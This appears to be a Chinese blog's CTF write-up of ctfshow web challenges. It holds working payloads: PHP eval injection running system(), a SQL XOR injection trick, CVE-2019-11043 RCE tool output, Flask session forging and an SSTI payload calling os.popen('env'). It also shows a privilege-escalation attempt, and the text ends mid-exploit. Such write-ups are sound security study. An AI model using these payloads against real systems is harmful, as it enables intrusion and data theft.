<!doctype html><html lang=en dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="刷"><title>ctfshow内部赛</title><link rel=canonical href=https://baozongwi.xyz/p/ctfshow-internal-competition/><link rel=stylesheet href=/scss/style.min.0fd9f1efab870423165ae7588bc203f4d3a9f9422c89352ef010f8c63e7225f0.css><meta property='og:title' content="ctfshow内部赛"><meta property='og:description' content="刷"><meta property='og:url' content='https://baozongwi.xyz/p/ctfshow-internal-competition/'><meta property='og:site_name' content="baozongwi's blog"><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='php'><meta property='article:tag' content='ssti'><meta property='article:tag' content='mysql'><meta property='article:published_time' content='2025-05-15T18:35:16+00:00'><meta property='article:modified_time' content='2025-05-15T18:35:16+00:00'><meta name=twitter:title content="ctfshow内部赛"><meta name=twitter:description content="刷"><link rel="shortcut icon" href=/logo.png></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label="Toggle Menu">
<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/acvtar_hu_773da4d2b586f7f.jpg width=300 height=300 class=site-logo loading=lazy alt=Avatar></a></figure><div class=site-meta><h1 class=site-name><a href=/>baozongwi's blog</a></h1></div></header><ol class=menu-social><li><a href=https://github.com/baozongwi target=_blank title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li><li><a href=mailto:baozongwi@qq.com target=_blank title=Email rel=me><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-mail"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M3 7a2 2 0 012-2h14a2 2 0 012 2v10a2 2 0 01-2 2H5a2 2 0 01-2-2V7z"/><path d="M3 7l9 6 9-6"/></svg></a></li><li><a href=https://discord.com/users/1276595362970337414 target=_blank title=discord rel=me><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-brand-discord"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M8 12a1 1 0 102 0 1 1 0 00-2 0"/><path d="M14 12a1 1 0 102 0 1 1 0 00-2 0"/><path d="M15.5 17c0 1 1.5 3 2 3 1.5.0 2.833-1.667 3.5-3 .667-1.667.5-5.833-1.5-11.5-1.457-1.015-3-1.34-4.5-1.5l-.972 1.923a11.913 11.913.0 00-4.053.0L9 4c-1.5.16-3.043.485-4.5 1.5-2 5.667-2.167 9.833-1.5 11.5.667 1.333 2 3 3.5 3 .5.0 2-2 2-3"/><path d="M7 16.5c3.5 1 6.5 1 10 0"/></svg></a></li><li><a href=https://www.yuque.com/baozongwi/kkn04k target=_blank title=travel rel=me><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-map-pin"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 11a3 3 0 106 0 3 3 0 00-6 0"/><path d="M17.657 16.657 13.414 20.9a2 2 0 01-2.827.0l-4.244-4.243a8 8 0 1111.314.0z"/></svg></a></li><li><a href=/index.xml target=_blank title=RSS rel=me><svg class="icon icon-tabler icon-tabler-rss" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="5" cy="19" r="1"/><path d="M4 4a16 16 0 0116 16"/><path d="M4 11a9 9 0 019 9"/></svg></a></li><li><a href=https://www.travellings.cn/go.html target=_blank title=Travelling rel=me><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width=".5" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-tram-front-icon lucide-tram-front"><rect width="16" height="16" x="4" y="3" rx="2"/><path d="M4 11h16"/><path d="M12 3v8"/><path d="m8 19-2 3"/><path d="m18 22-2-3"/><path d="M8 15h.01"/><path d="M16 15h.01"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
<span>Home</span></a></li><li><a href=/about/><svg class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="7" r="4"/><path d="M6 21v-2a4 4 0 014-4h4a4 4 0 014 4v2"/></svg>
<span>About</span></a></li><li><a href=/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
<span>Archives</span></a></li><li><a href=/links/><svg class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
<span>Links</span></a></li><li><a href=/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
<span>Search</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<span>Dark Mode</span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">Table of contents</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#签退>签退</a></li><li><a href=#登陆就有flag>登陆就有flag</a></li><li><a href=#一览无余>一览无余</a></li><li><a href=#蓝瘦>蓝瘦</a></li><li><a href=#出题人不想跟你说话jpg>出题人不想跟你说话.jpg</a></li><li><a href=#签到>签到</a></li></ol></nav></div></section></aside><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><header class=article-category><a href=/categories/ctfshow/>Ctfshow</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/ctfshow-internal-competition/>ctfshow内部赛</a></h2><h3 class=article-subtitle>刷</h3></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
<time class=article-time--published datetime=2025-05-15T18:35:16Z>May 15, 2025</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
<time class=article-time--reading>11 minute read</time></div></footer></div></header><section class=article-content><div class=outdated-notice><span class=outdated-notice__icon><svg class="icon icon-tabler icon-tabler-messages" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M21 14l-3-3h-7a1 1 0 01-1-1V4a1 1 0 011-1h9a1 1 0 011 1v10"/><path d="M14 15v2a1 1 0 01-1 1H6l-3 3V11a1 1 0 011-1h2"/></svg>
</span><span>友情提示：本文最后更新于 279 天前，文中的内容可能已有所发展或发生改变。</span></div><h2 id=签退>签退</h2><p>先做个签退热热身</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span> <span class=p>(</span><span class=nv>$S</span> <span class=o>=</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;S&#39;</span><span class=p>])</span><span class=o>?</span><span class=k>eval</span><span class=p>(</span><span class=s2>&#34;$</span><span class=si>$S</span><span class=s2>&#34;</span><span class=p>)</span><span class=o>:</span><span class=nx>highlight_file</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><p>多出来一个<code>$</code>，直接结束语句之后getshell即可</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>?S=a;phpinfo();
</span></span><span class=line><span class=cl>?S=a;system(&#34;cat ../../flag.txt&#34;);
</span></span></code></pre></td></tr></table></div></div><h2 id=登陆就有flag>登陆就有flag</h2><ul><li>长度限制为5</li><li>存在过滤且过滤的字符会有回显</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>mysql&gt; select * from flag where name=&#39;&#39;^0;
</span></span><span class=line><span class=cl>+----+------------+-------------------+
</span></span><span class=line><span class=cl>| id | name       | description       |
</span></span><span class=line><span class=cl>+----+------------+-------------------+
</span></span><span class=line><span class=cl>|  1 | alpha      | first             |
</span></span><span class=line><span class=cl>|  2 | beta       | second            |
</span></span><span class=line><span class=cl>|  3 | gamma      | third             |
</span></span><span class=line><span class=cl>|  4 | alphabet   | first-alphabet    |
</span></span><span class=line><span class=cl>|  5 | beta-gamma | second-beta-gamma |
</span></span><span class=line><span class=cl>+----+------------+-------------------+
</span></span><span class=line><span class=cl>5 rows in set (0.02 sec)
</span></span><span class=line><span class=cl>mysql&gt; select * from flag where id=&#39;&#39;^0;
</span></span><span class=line><span class=cl>Empty set
</span></span><span class=line><span class=cl>mysql&gt; select * from flag where description=&#39;&#39;^0;
</span></span><span class=line><span class=cl>+----+------------+-------------------+
</span></span><span class=line><span class=cl>| id | name       | description       |
</span></span><span class=line><span class=cl>+----+------------+-------------------+
</span></span><span class=line><span class=cl>|  1 | alpha      | first             |
</span></span><span class=line><span class=cl>|  2 | beta       | second            |
</span></span><span class=line><span class=cl>|  3 | gamma      | third             |
</span></span><span class=line><span class=cl>|  4 | alphabet   | first-alphabet    |
</span></span><span class=line><span class=cl>|  5 | beta-gamma | second-beta-gamma |
</span></span><span class=line><span class=cl>+----+------------+-------------------+
</span></span><span class=line><span class=cl>5 rows in set (0.02 sec)
</span></span></code></pre></td></tr></table></div></div><p>可以发现空值去异或0，可以查出所有非数字开头的值，所以payload就很好写出来了</p><h2 id=一览无余>一览无余</h2><p><strong>CVE-2019-11043</strong>，复现一下就好了 <a class=link href=https://github.com/neex/phuip-fpizdam target=_blank rel=noopener>poc</a></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>git clone https://github.com/neex/phuip-fpizdam.git
</span></span><span class=line><span class=cl>cd ~/Desktop/webTools/phuip-fpizdam
</span></span><span class=line><span class=cl>go get -v &amp;&amp; go build
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>go run . &#34;http://fcbd8cce-b60d-4ff6-9278-1caa1ef8807d.challenge.ctf.show/index.php&#34;
</span></span></code></pre></td></tr></table></div></div><p>回显大概是这样，可能会有点慢</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>2025/05/15 05:49:50 Base status code is 200
</span></span><span class=line><span class=cl>2025/05/15 05:49:57 Status code 502 for qsl=1765, adding as a candidate
</span></span><span class=line><span class=cl>2025/05/15 05:50:02 The target is probably vulnerable. Possible QSLs: [1755 1760 1765]
</span></span><span class=line><span class=cl>2025/05/15 05:52:07 Attack params found: --qsl 1755 --pisos 237 --skip-detect
</span></span><span class=line><span class=cl>2025/05/15 05:52:07 Trying to set &#34;session.auto_start=0&#34;...
</span></span><span class=line><span class=cl>2025/05/15 05:52:13 Detect() returned attack params: --qsl 1755 --pisos 237 --skip-detect &lt;-- REMEMBER THIS
</span></span><span class=line><span class=cl>2025/05/15 05:52:13 Performing attack using php.ini settings...
</span></span><span class=line><span class=cl>2025/05/15 05:52:19 Success! Was able to execute a command by appending &#34;?a=/bin/sh+-c+&#39;which+which&#39;&amp;&#34; to URLs
</span></span><span class=line><span class=cl>2025/05/15 05:52:19 Trying to cleanup /tmp/a...
</span></span><span class=line><span class=cl>2025/05/15 05:52:19 Done!
</span></span></code></pre></td></tr></table></div></div><p>然后RCE即可<code>?a=cat fl0gHe1e.txt</code></p><h2 id=蓝瘦>蓝瘦</h2><p>内存flag等会ENV看环境变量即可，随便登录一下，<code>ctfshow\ctfshow</code>进去之后看到有session，用工具分解一下，网站源码看到key为<code>ican</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>flask-unsign --decode --cookie &#39;eyJ1c2VybmFtZSI6ImN0ZnNob3cifQ.aCXkxg.Sh8FMZx5gD3ivBGfkZb0RIRstGY&#39;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>flask-unsign --sign --cookie &#34;{&#39;username&#39;: &#39;admin&#39;}&#34; --secret &#39;ican&#39;
</span></span></code></pre></td></tr></table></div></div><p>测试出来是ssti，直接打</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>GET</span> <span class=nn>/?ctfshow={{7*7}}</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>c02223f6-9a6c-41ae-99a8-61d669734dc5.challenge.ctf.show</span>
</span></span><span class=line><span class=cl><span class=n>Connection</span><span class=o>:</span> <span class=l>keep-alive</span>
</span></span><span class=line><span class=cl><span class=n>Pragma</span><span class=o>:</span> <span class=l>no-cache</span>
</span></span><span class=line><span class=cl><span class=n>Cache-Control</span><span class=o>:</span> <span class=l>no-cache</span>
</span></span><span class=line><span class=cl><span class=n>sec-ch-ua</span><span class=o>:</span> <span class=l>&#34;Chromium&#34;;v=&#34;136&#34;, &#34;Google Chrome&#34;;v=&#34;136&#34;, &#34;Not.A/Brand&#34;;v=&#34;99&#34;</span>
</span></span><span class=line><span class=cl><span class=n>sec-ch-ua-mobile</span><span class=o>:</span> <span class=l>?0</span>
</span></span><span class=line><span class=cl><span class=n>sec-ch-ua-platform</span><span class=o>:</span> <span class=l>&#34;Windows&#34;</span>
</span></span><span class=line><span class=cl><span class=n>Upgrade-Insecure-Requests</span><span class=o>:</span> <span class=l>1</span>
</span></span><span class=line><span class=cl><span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36</span>
</span></span><span class=line><span class=cl><span class=n>Accept</span><span class=o>:</span> <span class=l>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span>
</span></span><span class=line><span class=cl><span class=n>Sec-Fetch-Site</span><span class=o>:</span> <span class=l>cross-site</span>
</span></span><span class=line><span class=cl><span class=n>Sec-Fetch-Mode</span><span class=o>:</span> <span class=l>navigate</span>
</span></span><span class=line><span class=cl><span class=n>Sec-Fetch-User</span><span class=o>:</span> <span class=l>?1</span>
</span></span><span class=line><span class=cl><span class=n>Sec-Fetch-Dest</span><span class=o>:</span> <span class=l>document</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Encoding</span><span class=o>:</span> <span class=l>gzip, deflate, br, zstd</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Language</span><span class=o>:</span> <span class=l>zh-CN,zh;q=0.9,en;q=0.8</span>
</span></span><span class=line><span class=cl><span class=n>Cookie</span><span class=o>:</span> <span class=l>cf_clearance=FfFkJ_rCEzOW7OasGYKDaQdTABU_BVynV76XtJXtEMk-1737092124-1.2.1.1-08wtjOyMUOY8ThDT33UiGmkBadSYm33GtZ8UEqnhMYn45iIQYIfmtkdn0rCEq2cLjGXf0XdRXNrM4molLyQ8vDQnKyYt1ixrhYI8wUqSsnE_reHQM3L6B3Gr67nSRP1zSwCAeJEqXOf02wzTlhdAoBkjyG4DbDdMuMDw6HuBeMCHow7p3zZfJTguhcrd.YRyR8ZagXt2h1DBgZSdnioehaLAzj2nA8s1weMd_HWveEI4ls1PWJz.ADM_9UTNjpCJL6Rlu3t3JqrqEctObC1eUoGYZYf3LWHGDpgLNPYoVjs; session=eyJ1c2VybmFtZSI6ImFkbWluIn0.aCXlng.8uR6azDAknAoYBlvRRmBajQBXoo</span>
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>GET</span> <span class=nn>/?ctfshow={{url_for.__globals__.__builtins__[&#39;__import__&#39;](&#39;os&#39;).popen(&#39;env&#39;).read()}}</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>c02223f6-9a6c-41ae-99a8-61d669734dc5.challenge.ctf.show</span>
</span></span><span class=line><span class=cl><span class=n>Connection</span><span class=o>:</span> <span class=l>keep-alive</span>
</span></span><span class=line><span class=cl><span class=n>Pragma</span><span class=o>:</span> <span class=l>no-cache</span>
</span></span><span class=line><span class=cl><span class=n>Cache-Control</span><span class=o>:</span> <span class=l>no-cache</span>
</span></span><span class=line><span class=cl><span class=n>sec-ch-ua</span><span class=o>:</span> <span class=l>&#34;Chromium&#34;;v=&#34;136&#34;, &#34;Google Chrome&#34;;v=&#34;136&#34;, &#34;Not.A/Brand&#34;;v=&#34;99&#34;</span>
</span></span><span class=line><span class=cl><span class=n>sec-ch-ua-mobile</span><span class=o>:</span> <span class=l>?0</span>
</span></span><span class=line><span class=cl><span class=n>sec-ch-ua-platform</span><span class=o>:</span> <span class=l>&#34;Windows&#34;</span>
</span></span><span class=line><span class=cl><span class=n>Upgrade-Insecure-Requests</span><span class=o>:</span> <span class=l>1</span>
</span></span><span class=line><span class=cl><span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36</span>
</span></span><span class=line><span class=cl><span class=n>Accept</span><span class=o>:</span> <span class=l>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span>
</span></span><span class=line><span class=cl><span class=n>Sec-Fetch-Site</span><span class=o>:</span> <span class=l>cross-site</span>
</span></span><span class=line><span class=cl><span class=n>Sec-Fetch-Mode</span><span class=o>:</span> <span class=l>navigate</span>
</span></span><span class=line><span class=cl><span class=n>Sec-Fetch-User</span><span class=o>:</span> <span class=l>?1</span>
</span></span><span class=line><span class=cl><span class=n>Sec-Fetch-Dest</span><span class=o>:</span> <span class=l>document</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Encoding</span><span class=o>:</span> <span class=l>gzip, deflate, br, zstd</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Language</span><span class=o>:</span> <span class=l>zh-CN,zh;q=0.9,en;q=0.8</span>
</span></span><span class=line><span class=cl><span class=n>Cookie</span><span class=o>:</span> <span class=l>cf_clearance=FfFkJ_rCEzOW7OasGYKDaQdTABU_BVynV76XtJXtEMk-1737092124-1.2.1.1-08wtjOyMUOY8ThDT33UiGmkBadSYm33GtZ8UEqnhMYn45iIQYIfmtkdn0rCEq2cLjGXf0XdRXNrM4molLyQ8vDQnKyYt1ixrhYI8wUqSsnE_reHQM3L6B3Gr67nSRP1zSwCAeJEqXOf02wzTlhdAoBkjyG4DbDdMuMDw6HuBeMCHow7p3zZfJTguhcrd.YRyR8ZagXt2h1DBgZSdnioehaLAzj2nA8s1weMd_HWveEI4ls1PWJz.ADM_9UTNjpCJL6Rlu3t3JqrqEctObC1eUoGYZYf3LWHGDpgLNPYoVjs; session=eyJ1c2VybmFtZSI6ImFkbWluIn0.aCXlng.8uR6azDAknAoYBlvRRmBajQBXoo</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=出题人不想跟你说话jpg>出题人不想跟你说话.jpg</h2><p>密码为<code>cai</code>，先链接木马先，权限不够需要提权，查看进程发现定时任务，查看定时任务<code>cat /etc/crontab</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl># /etc/crontab: system-wide crontab
</span></span><span class=line><span class=cl># Unlike any other crontab you don&#39;t have to run the `crontab&#39;
</span></span><span class=line><span class=cl># command to install the new version when you edit this file
</span></span><span class=line><span class=cl># and files in /etc/cron.d. These files also have username fields,
</span></span><span class=line><span class=cl># that none of the other crontabs do.
</span></span><span class=line><span class=cl>SHELL=/bin/sh
</span></span><span class=line><span class=cl>PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
</span></span><span class=line><span class=cl># m h dom mon dow user    command
</span></span><span class=line><span class=cl>17 *    * * *    root    cd / &amp;&amp; run-parts --report /etc/cron.hourly
</span></span><span class=line><span class=cl>25 6    * * *    root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )
</span></span><span class=line><span class=cl>47 6    * * 7    root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )
</span></span><span class=line><span class=cl>52 6    1 * *    root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )
</span></span><span class=line><span class=cl>#
</span></span><span class=line><span class=cl>*/1 *    * * *    root    /usr/sbin/logrotate -vf /etc/logrotate.d/nginx
</span></span></code></pre></td></tr></table></div></div><p>看了一下文件权限，不能修改文件，也就是说不能定时任务提权，看系统<code>cat /etc/os-release</code>，发现是<code>PRETTY_NAME="Ubuntu 14.04.5 LTS"</code>，查找提权文章，找到<a class=link href=https://blog.csdn.net/EC_Carrot/article/details/114597448 target=_blank rel=noopener>一个</a>，但是发现我们内核版本是<code>5.4.0-163-generi</code>不满足条件，想利用<strong>CVE-2021-3493</strong>来提权，也失败了，问AI是说靶机是docker，但是这个洞是在的主机，最后我突然想起还有一个<code>nginx</code>的洞<strong>CVE-2016-1247</strong></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
